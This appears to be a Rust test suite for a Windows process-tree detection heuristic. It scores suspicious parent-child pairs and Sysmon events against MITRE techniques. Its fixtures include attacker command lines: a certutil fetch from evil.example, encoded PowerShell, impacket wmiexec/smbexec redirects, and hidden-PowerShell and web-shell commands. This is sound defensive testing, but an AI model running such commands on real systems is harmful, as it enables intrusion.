    /// high-integrity chain fire once corroborated?" — using certutil LOLBAS as the
    /// corroborating combo instead; NOT rundll32, which is also a PROTECTED_SYSTEM_NAME
    /// and would additionally fire S3 masquerade, inflating the weight.)
    #[test]
    fn unsigned_high_integrity_amplifies_with_signal() {
        let mut p = proc(
            12,
            0,
            r"C:\Users\a\AppData\Local\Temp\certutil.exe",
            "certutil.exe http://evil.example/x.dll",
        );
        p.signed = Some(false);
        p.integrity = Some("high".into());
        let s = score_process(&p, None);
        // LOLBAS 30 + suspicious path 25 + unsigned 20 + unsigned-high-integrity 15 = 90
        assert_eq!(s.weight, 90);
        assert!(s.reasons.iter().any(|r| r.contains("suspicious path")));
        assert!(s.reasons.iter().any(|r| r.contains("unsigned")));
    }

    /// Signed (Some(true)) with a suspicious path but no prior combo: suspicious-path
    /// no longer fires alone (path-as-amplifier model), so weight is 0 and — a
    /// fortiori — no unsigned amplifier fires either. (Renamed from
    /// `signed_does_not_amplify`, which asserted the old independent path weight of 25;
    /// its core intent, "a signed binary never gets the unsigned amplifier," is
    /// subsumed by `unsigned_high_integrity_amplifies_with_signal`'s signed==Some(false)
    /// vs the None default used throughout this module's other tests.)
    #[test]
    fn signed_with_suspicious_path_alone_gated_out() {
        let mut p = proc(13, 0, r"C:\Users\a\AppData\Local\Temp\x.exe", "x.exe");
        p.signed = Some(true);
        let s = score_process(&p, None);
        assert_eq!(s.weight, 0);
        assert!(!s.reasons.iter().any(|r| r.contains("unsigned")));
    }

    use cairn_core::record::Record;
    use cairn_core::traits::Analyzer;

    fn rec(p: ProcessRecord) -> Record {
        Record::Process(p)
    }

    /// Own PID must never produce a finding even when the image path is suspicious.
    #[test]
    fn own_process_not_flagged() {
        use std::process;
        let own_pid = process::id();
        let own = Record::Process(proc(
            own_pid,
            4,
            r"C:\Users\x\AppData\Local\cairn-target\release\cairn.exe",
            "",
        ));
        let findings = ParentChildHeuristic.analyze(&[own], &[]).expect("analyze");
        assert!(findings.is_empty(), "own PID must never produce a finding");
    }

    /// A suspicious path alone (no prior behavioral combo) is no longer a finding on
    /// its own under the path-as-amplifier model — even for a different PID than our
    /// own. (Renamed from `other_pid_suspicious_path_still_flagged`, which asserted a
    /// finding fires for suspicious-path-alone under the old independent-signal model.)
    #[test]
    fn suspicious_path_alone_is_not_a_finding() {
        use std::process;
        let own_pid = process::id();
        let other = Record::Process(proc(
            own_pid + 9999,
            4,
            r"C:\Users\x\AppData\Local\cairn-target\release\cairn.exe",
            "",
        ));
        let findings = ParentChildHeuristic
            .analyze(&[other], &[])
            .expect("analyze");
        assert!(
            findings.is_empty(),
            "suspicious path alone must not produce a finding"
        );
    }

    // --- R6: human-readable details field ---

    /// details should contain process name + pid, NOT raw "image=" key-value debug format.
    #[test]
    fn process_details_format() {
        // Use Office-spawns-PowerShell to guarantee a finding above the noise floor.
        let parent = rec(proc(
            100,
            4,
            r"C:\Program Files\Microsoft Office\winword.exe",
            "",
        ));
        let child = rec(proc(
            200,
            100,
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
        ));
        let findings = ParentChildHeuristic
            .analyze(&[parent, child], &[])
            .expect("analyze");
        assert!(!findings.is_empty(), "should produce at least one finding");
        let details = &findings[0].details;
        // Must contain the process name (last segment of image path).
        assert!(
            details.contains("powershell.exe"),
            "process name missing: {details}"
        );
        // Must contain the PID.
        assert!(
            details.contains("200") || details.contains("pid="),
            "pid missing: {details}"
        );
        // Must NOT use raw debug "image=" or "ppid=" key-value format.
        assert!(
            !details.contains("image="),
            "must not use debug key=value format: {details}"
        );
    }

    /// When cmdline is empty, details omit the cmd= field. Uses the S3 masquerade
    /// signal (dispositive alone) to guarantee a finding without relying on the now-
    /// gated suspicious-path-alone signal (renamed fixture from a bare Temp path,
    /// which under the path-as-amplifier model no longer produces a finding on its
    /// own — see `suspicious_path_alone_is_not_a_finding`).
    #[test]
    fn process_details_no_cmdline_when_empty() {
        let p = rec(proc(
            400,
            4,
            r"C:\Users\a\AppData\Roaming\svchost.exe",
            "", // empty cmdline
        ));
        let findings = ParentChildHeuristic.analyze(&[p], &[]).expect("analyze");
        assert!(
            !findings.is_empty(),
            "masquerade signal should produce a finding"
        );
        let details = &findings[0].details;
        assert!(
            !details.contains("cmd="),
            "empty cmdline must not produce cmd= field: {details}"
        );
        assert!(
            details.contains("svchost.exe"),
            "binary name missing: {details}"
        );
    }

    /// The analyzer emits one Heuristic finding (with reason + entity) for a malicious
    /// Office->encoded-PS pair, and nothing for a benign process.
    #[test]
    fn analyzer_emits_finding_for_malicious_pair_only() {
        let parent = proc(100, 4, r"C:\...\winword.exe", "");
        let child = proc(
            200,
            100,
            r"C:\...\powershell.exe",
            "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
        );
        let mut benign = proc(60, 50, r"C:\Windows\System32\notepad.exe", "notepad.exe");
        benign.signed = Some(true);
        let recs = vec![rec(parent), rec(child), rec(benign)];

        let findings = ParentChildHeuristic.analyze(&recs, &[]).expect("analyze");
        assert_eq!(findings.len(), 1, "only the malicious child should fire");
        let f = &findings[0];
        assert!(matches!(f.source, cairn_core::FindingSource::Heuristic));
        assert!(f.reason.is_some(), "golden rule 6: reason required");
        assert!(f.entity.process.is_some());
        assert!(f.mitre.contains(&"T1059.001".to_string()));
    }

    /// S3 masquerade fires alone (dispositive, weight 60) and — because it is itself a
    /// fired combo signal — also unlocks the suspicious-path amplifier (+25) for the
    /// same `\AppData\Roaming\` path: 60 + 25 = 85, severity_for(85) = Critical (the
    /// 70.. band). This proves masquerade needs no OTHER corroborating signal to emit
    /// a finding, which is the property under test (severity ends up even higher than
    /// the bare 60 because the path amplifier stacks on top).
    #[test]
    fn masquerade_svchost_in_appdata_fires_high_alone() {
        let p = rec(proc(500, 0, r"C:\Users\a\AppData\Roaming\svchost.exe", ""));
        let findings = ParentChildHeuristic.analyze(&[p], &[]).expect("analyze");
        assert_eq!(
            findings.len(),
            1,
            "masquerade should produce exactly one finding"
        );
        let f = &findings[0];
        assert_eq!(f.severity, cairn_core::Severity::Critical);
        assert!(f.mitre.contains(&"T1036.005".to_string()));
    }

    #[test]
    fn reused_parent_pid_started_after_the_child_is_ignored() {
        let t0: chrono::DateTime<chrono::Utc> = "2026-10-20T08:00:00Z".parse().unwrap();
        let mut child = proc(
            200,
            100,
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -NoProfile -File C:\\scripts\\inventory.ps1",
        );
        child.start_time = Some(t0);
        // PID 100 was the logon script host, long gone; Word now holds the PID.
        let mut word = proc(100, 4, r"C:\Program Files\Microsoft Office\WINWORD.EXE", "");
        word.start_time = Some(t0 + chrono::Duration::hours(3));
        assert!(analyze_pair(word.clone(), child.clone()).is_empty());
        // The genuine pairing (Word started first) still fires.
        word.start_time = Some(t0 - chrono::Duration::minutes(1));
        assert!(!analyze_pair(word, child).is_empty());
    }

    fn analyze_pair(parent: ProcessRecord, child: ProcessRecord) -> Vec<Finding> {
        ParentChildHeuristic
            .analyze(&[rec(parent), rec(child)], &[])
            .expect("analyze")
    }

    #[test]
    fn explorer_spawning_mshta_is_clickfix_high() {
        let f = analyze_pair(
            proc(10, 1, r"C:\Windows\explorer.exe", "explorer.exe"),
            proc(
                11,
                10,
                r"C:\Windows\System32\mshta.exe",
                r#""C:\Windows\System32\mshta.exe" C:\Users\a\Downloads\verify.hta"#,
            ),
        );
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, cairn_core::Severity::High);
        assert!(f[0].mitre.contains(&"T1204.004".to_string()));
        assert!(f[0].reason.as_deref().unwrap().contains("ClickFix"));
        let client = f[0].details_client.as_deref().unwrap();
        assert!(client.contains("ClickFix"), "{client}");
        assert!(!client.contains("可能為偽裝或橫向移動"), "{client}");
    }

    #[test]
    fn web_and_database_servers_spawning_shells_are_web_shells() {
        for (parent_img, parent_cmd, child_img) in [
            (
                r"C:\Windows\System32\inetsrv\w3wp.exe",
                "w3wp.exe -ap DefaultAppPool",
                r"C:\Windows\System32\cmd.exe",
            ),
            (
                r"C:\Program Files\Microsoft SQL Server\MSSQL\Binn\sqlservr.exe",
                "sqlservr.exe -sMSSQLSERVER",
                r"C:\Windows\System32\cmd.exe",
            ),
            (
                r"C:\nginx\nginx.exe",
                "nginx.exe",
                r"C:\Windows\System32\whoami.exe",
            ),
            (
                r"C:\Program Files\Apache\Tomcat9\bin\tomcat9.exe",
                "tomcat9.exe //RS//Tomcat9",
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            ),
            (
                r"C:\Program Files\Java\jre\bin\java.exe",
                "java.exe -classpath bootstrap.jar org.apache.catalina.startup.Bootstrap start",
                r"C:\Windows\System32\cmd.exe",
            ),
        ] {
            let f = analyze_pair(
                proc(20, 1, parent_img, parent_cmd),
                proc(21, 20, child_img, "x /c whoami"),
            );
            assert_eq!(f.len(), 1, "{parent_img}");
            assert_eq!(f[0].severity, cairn_core::Severity::High, "{parent_img}");
            assert!(f[0].mitre.contains(&"T1505.003".to_string()));
            assert!(f[0].details_client.is_some());
        }
        let sql = analyze_pair(
            proc(20, 1, r"C:\SQL\sqlservr.exe", ""),
            proc(21, 20, r"C:\Windows\System32\cmd.exe", "cmd /c whoami"),
        );
        assert!(sql[0].reason.as_deref().unwrap().contains("xp_cmdshell"));
        // a developer's java (not Tomcat) starting cmd is not a web shell
        let dev = analyze_pair(
            proc(
                20,
                1,
                r"C:\Program Files\Java\bin\java.exe",
                "java -jar gradle.jar",
            ),
            proc(21, 20, r"C:\Windows\System32\cmd.exe", "cmd /c build.bat"),
        );
        assert!(dev.is_empty());
    }

    #[test]
    fn wmiprvse_shell_is_t1047_and_wmiexec_output_escalates() {
        let wmi = proc(30, 1, r"C:\Windows\System32\wbem\WmiPrvSE.exe", "");
        let plain = analyze_pair(
            wmi.clone(),
            proc(
                31,
                30,
                r"C:\Windows\System32\cmd.exe",
                "cmd.exe /c ipconfig",
            ),
        );
        assert_eq!(plain.len(), 1);
        assert_eq!(plain[0].severity, cairn_core::Severity::Medium);
        assert!(plain[0].mitre.contains(&"T1047".to_string()));
        let wmiexec = analyze_pair(
            wmi,
            proc(
                31,
                30,
                r"C:\Windows\System32\cmd.exe",
                r"cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1700000000.12 2>&1",
            ),
        );
        assert_eq!(wmiexec[0].severity, cairn_core::Severity::Critical);
        assert!(wmiexec[0]
            .details_client
            .as_deref()
            .unwrap()
            .contains("wmiexec"));
    }

    #[test]
    fn services_exe_remote_service_execution_is_t1569_002() {
        let services = proc(40, 1, r"C:\Windows\System32\services.exe", "");
        let smbexec = analyze_pair(
            services.clone(),
            proc(
                41,
                40,
                r"C:\Windows\System32\cmd.exe",
                r"%COMSPEC% /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat",
            ),
        );
        assert_eq!(smbexec.len(), 1);
        assert_eq!(smbexec[0].severity, cairn_core::Severity::High);
        assert!(smbexec[0].mitre.contains(&"T1569.002".to_string()));
        let psexesvc = analyze_pair(
            services.clone(),
            proc(42, 40, r"C:\Windows\PSEXESVC.exe", ""),
        );
        assert!(psexesvc[0].mitre.contains(&"T1569.002".to_string()));
        // services.exe starting cmd for an ordinary service command is not flagged
        let benign = analyze_pair(
            services,
            proc(
                43,
                40,
                r"C:\Windows\System32\cmd.exe",
                r"cmd /c C:\svc\start.bat",
            ),
        );
        assert!(benign.is_empty());
    }

    /// A system binary name inside the Windows tree but outside its canonical
    /// directory is High (no longer trusted just for being under C:\Windows).
    #[test]
    fn system_name_outside_canonical_dir_inside_windows_is_high() {
        let p = rec(proc(
            502,
            0,
            r"C:\Windows\System32\spool\drivers\color\lsass.exe",
            "",
        ));
        let f = ParentChildHeuristic.analyze(&[p], &[]).expect("analyze");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, cairn_core::Severity::High);
        assert!(f[0].mitre.contains(&"T1036.005".to_string()));
        let reason = f[0].reason.as_deref().unwrap();
        assert!(reason.contains(r"C:\windows\system32"), "{reason}");
        assert!(f[0]
            .details_client
            .as_deref()
            .unwrap()
            .contains("lsass.exe"));
    }

    /// The client sentence names the strongest signal, never the old generic line.
    #[test]
    fn client_text_is_specific_to_the_strongest_signal() {
        let f = analyze_pair(
            proc(100, 4, r"C:\Program Files\Microsoft Office\winword.exe", ""),
            proc(
                200,
                100,
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
            ),
        );
        let client = f[0].details_client.as_deref().unwrap();
        assert!(client.contains("winword.exe"), "{client}");
        assert!(client.contains("巨集"), "{client}");
    }

    /// The real svchost.exe in its legitimate System32 home must never fire the
    /// masquerade signal.
    #[test]
    fn real_svchost_in_system32_does_not_fire() {
        let p = rec(proc(501, 0, r"C:\Windows\System32\svchost.exe", ""));
        let findings = ParentChildHeuristic.analyze(&[p], &[]).expect("analyze");
        assert!(
            findings.is_empty(),
            "legitimate svchost.exe must not be flagged"
        );
    }

    // --- Process starts from the event logs (4688 / Sysmon 1) ---

    use cairn_core::record::EventRecord;
    use cairn_core::Severity;
    use serde_json::{json, Value};

    fn event(channel: &str, id: u32, record_id: u64, v: Value) -> Record {
        let Value::Object(data) = v else {
            unreachable!()
        };
        Record::Event(EventRecord {
            ts: "2019-04-30T20:26:51Z".parse().unwrap(),
            channel: channel.into(),
            event_id: id,
            provider: String::new(),
            computer: "IEWIN7".into(),
            record_id,
            data,
        })
    }

    /// A Sysmon 1 with the given child and parent.
    fn sysmon1(pid: u32, image: &str, cmd: &str, parent_image: &str, parent_cmd: &str) -> Record {
        event(
            SYSMON_CHANNEL,
            1,
            u64::from(pid),
            json!({
                "ProcessId": pid.to_string(),
                "Image": image,
                "CommandLine": cmd,
                "User": r"IEWIN7\IEUser",
                "ParentProcessId": "836",
                "ParentImage": parent_image,
                "ParentCommandLine": parent_cmd,
            }),
        )
    }

    fn run(records: &[Record]) -> Vec<Finding> {
        ParentChildHeuristic.analyze(records, &[]).expect("analyze")
    }

    fn has(f: &Finding, technique: &str) -> bool {
        f.mitre.iter().any(|m| m == technique)
    }

    const WMIPRVSE: &str = r"C:\Windows\System32\wbem\WmiPrvSE.exe";
    const WMIPRVSE_CMD: &str = r"C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding";
    const CMD: &str = r"C:\Windows\System32\cmd.exe";

    /// Real shape: `LM_wmiexec_impacket_sysmon_whoami.evtx`.
    #[test]
    fn sysmon_wmiexec_under_wmiprvse_is_critical() {
        let f = run(&[sysmon1(
            2828,
            CMD,
            r"cmd.exe /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\__1556656369.7 2>&1",
            WMIPRVSE,
            WMIPRVSE_CMD,
        )]);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Critical);
        assert!(has(&f[0], "T1047") && has(&f[0], "T1021.002"));
        assert_eq!(f[0].artifact, "evtx:Microsoft-Windows-Sysmon/Operational");
        assert_eq!(f[0].event_id, Some(1));
        assert_eq!(f[0].user.as_deref(), Some(r"IEWIN7\IEUser"));
        assert!(
            f[0].details.contains("parent=836 wmiprvse.exe"),
            "{}",
            f[0].details
        );
        assert!(f[0].details_client.as_deref().unwrap().contains("wmiexec"));
        assert_eq!(f[0].analyzer, ParentChildHeuristic::NAME);
    }

    /// Real shape: `LM_impacket_docmexec_mmc_sysmon_01.evtx` (dcomexec, MMC20): no
    /// parent rule for mmc.exe, the output redirect alone is High.
    #[test]
    fn impacket_output_redirect_is_high_under_any_parent() {
        let f = run(&[sysmon1(
            1256,
            CMD,
            r#""C:\Windows\System32\cmd.exe" /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\__1556656511.61 2>&1"#,
            r"C:\Windows\System32\mmc.exe",
            r"C:\Windows\system32\mmc.exe -Embedding",
        )]);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert!(has(&f[0], "T1047") && has(&f[0], "T1021.002"));
        assert!(f[0].reason.as_deref().unwrap().contains("mmc.exe"));
        // A 4688 without ParentProcessName and without a parent start: still High.
        let f = run(&[event(
            "Security",
            4688,
            7,
            json!({
                "NewProcessId": "0x9c4",
                "NewProcessName": CMD,
                "ProcessId": "0x111",
                "SubjectUserName": "admin",
                "CommandLine": r"C:\Windows\system32\cmd.exe /Q /c echo dir ^> \\127.0.0.1\C$\__output 2^>^&1 > C:\Windows\TEMP\execute.bat",
            }),
        )]);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert_eq!(f[0].artifact, "evtx:Security");
        // A UNC path elsewhere is not the pattern.
        let f = run(&[sysmon1(
            1,
            CMD,
            r"cmd.exe /c copy report.txt \\fileserver\share\reports\",
            r"C:\Windows\explorer.exe",
            "explorer.exe",
        )]);
        assert!(f.is_empty(), "{f:?}");
    }

    /// Real shape: `LM_WMI_4624_4688_TargetHost.evtx` (Windows 7: no
    /// ParentProcessName, no command line): WmiPrvSE -> calc.exe by creator pid.
    #[test]
    fn wmiprvse_starting_calc_in_4688_is_medium_t1047() {
        let ev = |rid: u64, pid: &str, ppid: &str, image: &str| {
            event(
                "Security",
                4688,
                rid,
                json!({
                    "SubjectUserName": "WIN-77LTAPHIQ1R$",
                    "NewProcessId": pid,
                    "NewProcessName": image,
                    "ProcessId": ppid,
                    "CommandLine": "",
                }),
            )
        };
        let f = run(&[
            ev(1, "0xae8", "0x248", WMIPRVSE),
            ev(2, "0x424", "0xae8", r"C:\Windows\System32\calc.exe"),
        ]);
        assert_eq!(f.len(), 1, "{f:?}");
        assert_eq!(f[0].severity, Severity::Medium);
        assert!(has(&f[0], "T1047"));
        assert!(f[0].title.contains("calc.exe"));
        assert_eq!(f[0].evidence_ref.as_deref(), Some("Security#2"));
    }

    /// WmiPrvSE starting routine or vendor programs stays quiet.
    #[test]
    fn wmiprvse_routine_and_vendor_children_are_quiet() {
        for (image, cmd) in [
            (
                r"C:\Windows\System32\WerFault.exe",
                "WerFault.exe -u -p 1234 -s 56",
            ),
            (r"C:\Windows\System32\wbem\WmiApSrv.exe", "WmiApSrv.exe"),
            (
                r"C:\Program Files\Dell\CommandUpdate\dcu-cli.exe",
                r#""C:\Program Files\Dell\CommandUpdate\dcu-cli.exe" /scan"#,
            ),
            (
                r"C:\Program Files (x86)\Lenovo\System Update\tvsu.exe",
                "tvsu.exe /CM",
            ),
            (r"C:\Windows\CCM\CcmEval.exe", "CcmEval.exe"),
            (
                r"C:\Windows\System32\msiexec.exe",
                r"msiexec.exe /i C:\Deploy\agent.msi /qn",
            ),
        ] {
            let f = run(&[sysmon1(10, image, cmd, WMIPRVSE, WMIPRVSE_CMD)]);
            assert!(f.is_empty(), "{image}: {f:?}");
        }
        // The same vendor binary from a user folder is not routine.
        let f = run(&[sysmon1(
            10,
            r"C:\Users\Public\dcu-cli.exe",
            "dcu-cli.exe",
            WMIPRVSE,
            WMIPRVSE_CMD,
        )]);
        assert_eq!(f.len(), 1);
        // Real `LM_wmi_PoisonHandler...`: WmiPrvSE -> rundll32 url.dll handler.
        let f = run(&[sysmon1(
            4180,
            r"C:\Windows\System32\rundll32.exe",
            "rundll32 url.dll,FileProtocolHandler ms-browser://",
            WMIPRVSE,
            WMIPRVSE_CMD,
        )]);
        assert_eq!(f.len(), 1);
        assert!(has(&f[0], "T1047"));
    }

    /// Real shape: `LM_sysmon_psexec_smb_meterpreter.evtx` (Metasploit psexec_psh).
    #[test]
    fn services_starting_hidden_powershell_is_high() {
        let f = run(&[sysmon1(
            3348,
            CMD,
            r#"C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}""#,
            r"C:\Windows\System32\services.exe",
            r"C:\Windows\system32\services.exe",
        )]);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert!(has(&f[0], "T1569.002") && has(&f[0], "T1059.001"));
        // A service wrapper batch file stays quiet; a plain PowerShell service is Medium.
        let quiet = run(&[sysmon1(
            1,
            CMD,
            r"cmd /c C:\svc\start.bat",
            r"C:\Windows\System32\services.exe",
            "",
        )]);
        assert!(quiet.is_empty());
        let plain = run(&[sysmon1(
            2,
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            r"powershell.exe -File C:\svc\run.ps1",
            r"C:\Windows\System32\services.exe",
            "",
        )]);
        assert_eq!(plain[0].severity, Severity::Medium);
    }

    /// Real shape: `LM_typical_IIS_webshell_sysmon_1_10_traces.evtx`.
    #[test]
    fn sysmon_w3wp_spawning_cmd_is_web_shell() {
        let f = run(&[sysmon1(
            2404,
            CMD,
            r#""c:\windows\system32\cmd.exe" /c net user"#,
            r"C:\Windows\System32\inetsrv\w3wp.exe",
            r#"c:\windows\system32\inetsrv\w3wp.exe -ap "DefaultAppPool" -v "v2.0""#,
        )]);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert!(has(&f[0], "T1505.003"));
    }

    /// Office starting a script host is a macro; Office starting its own updater or
    /// a browser is not.
    #[test]
    fn office_children_from_events() {
        let word = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE";
        // Win10 4688 with ParentProcessName.
        let f = run(&[event(
            "Security",
            4688,
            3,
            json!({
                "NewProcessId": "0x1a0",
                "NewProcessName": r"C:\Windows\System32\wscript.exe",
                "ProcessId": "0x100",
                "ParentProcessName": word,
                "SubjectUserName": "alice",
                "TargetUserName": "-",
                "CommandLine": r#"wscript.exe "C:\Users\alice\AppData\Local\Temp\invoice.js""#,
            }),
        )]);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert!(has(&f[0], "T1059"));
        assert_eq!(f[0].user.as_deref(), Some("alice"));
        for (image, cmd) in [
            (
                r"C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeC2RClient.exe",
                "OfficeC2RClient.exe /frequentupdate SCHEDULEDTASK",
            ),
            (
                r"C:\Program Files\Microsoft Office\root\Office16\MSOSYNC.EXE",
                "MSOSYNC.EXE",
            ),
            (
                r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                r#""msedge.exe" --single-argument https://contoso.sharepoint.com/doc"#,
            ),
        ] {
            let f = run(&[sysmon1(20, image, cmd, word, "WINWORD.EXE /n")]);
            assert!(f.is_empty(), "{image}: {f:?}");
        }
    }

    /// Sysmon OriginalFileName exposes a renamed shell; a real one is quiet.
    #[test]
    fn renamed_shell_from_original_file_name() {
        let ev = |image: &str, ofn: &str| {
            event(
                SYSMON_CHANNEL,
                1,
                5,
                json!({
                    "ProcessId": "77",
                    "Image": image,
                    "CommandLine": format!("{image} /c whoami"),
                    "OriginalFileName": ofn,
                    "ParentImage": r"C:\Windows\explorer.exe",
                }),
            )
        };
        let f = run(&[ev(r"D:\Tools\svchelper.exe", "Cmd.Exe")]);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
        assert!(has(&f[0], "T1036.003"));
        // In a user-writable folder the path amplifier stacks on top.
        let f = run(&[ev(r"C:\Users\Public\svchelper.exe", "Cmd.Exe")]);
        assert_eq!(f[0].severity, Severity::Critical);
        assert!(run(&[ev(CMD, "Cmd.Exe")]).is_empty());
        // pwsh.exe's OriginalFileName is pwsh.dll: not a rename.
        assert!(run(&[ev(r"C:\Program Files\PowerShell\7\pwsh.exe", "pwsh.dll")]).is_empty());
        assert_eq!(
            renamed_launcher("RUNDLL32.EXE", r"C:\Temp\r.exe").as_deref(),
            Some("rundll32")
        );
        assert_eq!(renamed_launcher("chrome.exe", r"C:\x\y.exe"), None);
    }

    /// A process that is still running and has its Sysmon 1 is reported once (live).
    #[test]
    fn live_process_and_its_event_are_one_finding() {
        let cmd = r"cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1556656369.7 2>&1";
        let f = run(&[
            rec(proc(836, 4, WMIPRVSE, WMIPRVSE_CMD)),
            rec(proc(2828, 836, CMD, cmd)),
            sysmon1(2828, CMD, cmd, WMIPRVSE, WMIPRVSE_CMD),
        ]);
        assert_eq!(f.len(), 1, "{f:?}");
        assert_eq!(f[0].artifact, "process");
    }
}
